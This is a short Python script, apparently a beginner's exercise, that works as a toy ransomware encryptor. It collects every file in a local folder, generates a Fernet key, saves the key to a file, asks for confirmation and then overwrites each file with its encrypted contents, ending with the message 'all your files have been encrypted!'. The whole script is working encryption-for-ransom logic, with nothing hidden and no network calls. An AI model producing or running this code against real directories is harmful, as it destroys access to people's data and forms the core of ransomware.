import os
from cryptography.fernet import Fernet

files = []

files_path = "files_/"

for file in os.listdir("files_"):
    # os.path.join(files_path, file) is written to give full path of boat.txt though the condition itself isn't
    # necessary considering only files will be kept in files_
    if os.path.isfile(os.path.join(files_path, file)):
        files.append(files_path + file)

key = Fernet.generate_key()

# opening a file called thekey.key(I think that if it doesn't find a file named thekey.key it'll create one
# automatically) in write binary mode, calling it as thekey
with open("key/thekey.key", "wb") as thekey:
    # thekey is actually thekey.key as mentioned above.
    # so, now we write the key into the thekey.key file
    thekey.write(key)

# confirming
sure = input("Are you sure? (y/n): ")

# going through all the files, i.e, boat.txt, etc.
if sure.lower() == "y":
    for file in files:
        # opening boat.txt in read binary mode and calling boat.txt as "thefile" now
        # remember that file is also boat.txt in first iteration
        with open(file, "rb") as thefile:
            # contents is now boat.txt
            contents = thefile.read()
            # contents_encrypted is now the boat.txt file encrypted with the key
            contents_encrypted = Fernet(key).encrypt(contents)

        # opening boat.txt in wb as thefile
        with open(file, "wb") as thefile:
            # overwriting the contents of boat.txt with contents_encrypted
            thefile.write(contents_encrypted)
    print("yo, all your files have been encrypted!")

else:
    print("Your files are safe.")


